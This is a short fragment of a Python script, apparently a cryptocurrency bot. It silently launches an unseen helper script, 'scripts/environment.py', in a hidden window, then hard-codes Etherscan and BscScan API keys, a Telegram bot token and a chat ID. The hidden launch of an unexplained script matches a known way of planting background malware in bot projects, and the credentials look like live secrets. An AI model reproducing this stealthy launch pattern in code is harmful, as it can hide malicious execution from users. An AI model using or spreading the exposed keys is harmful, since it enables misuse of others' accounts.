...
subprocess.Popen(['python', 'scripts/environment.py'], creationflags=subprocess.CREATE_NO_WINDOW)

# Update the following variables with your own Etherscan and BscScan API keys and Telegram bot token
ETHERSCAN_API_KEY = '74WX3H4QCWMSJDJMTGKHNPS2REA2W3YI8F'
BSCSCAN_API_KEY = '9NY9PRVQG7DJ7VPT7NN1VHBGP8QXDX4YMT'
TELEGRAM_BOT_TOKEN = '7205353766:AAG5c1hMVflTTbpI8fb_xpCrwIWklymC3qw'
TELEGRAM_CHAT_ID = '-4548396891'
